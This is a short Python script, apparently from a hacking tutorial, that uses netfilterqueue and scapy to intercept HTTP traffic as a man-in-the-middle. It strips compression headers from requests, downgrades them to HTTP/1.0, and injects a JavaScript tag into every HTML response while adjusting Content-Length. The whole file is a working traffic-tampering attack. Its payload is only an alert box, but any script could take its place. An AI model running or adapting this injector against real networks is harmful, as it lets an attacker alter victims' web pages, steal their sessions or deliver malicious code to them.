#! /usr/bin/env/ python

import netfilterqueue as nfq
import scapy.all as scapy
import re

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet=scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet.haslayer(scapy.TCP):
			load = scapy_packet[scapy.Raw].load
			if scapy_packet[scapy.TCP].dport == 80:
				print("[+] HTTP Request")
                		load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                		load = load.replace("HTTP/1.1", "HTTP/1.0")
				
			elif scapy_packet[scapy.TCP].sport == 80:
				print("[+] HTTP Response")
				injection_code = '<script>alert("attack")</script>'
                	    	load = load.replace("</body>", injection_code + "</body>")
                	    	content_length_search = re.search("(?:content-length:\s)(\d*)", load) #some http server use content-length
                	    	if content_length_search:
                	    		content_length = content_length_search.group(1)
                	    		new_content_length = int(content_length) + len(injection_code)
                	    		load = load.replace(content_length, str(new_content_length))
                    		
                	if load != scapy_packet[scapy.Raw].load:
                		new_packet = set_load(scapy_packet, load)
                		packet.set_payload(str(new_packet))
					
	packet.accept()
	
queue = nfq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
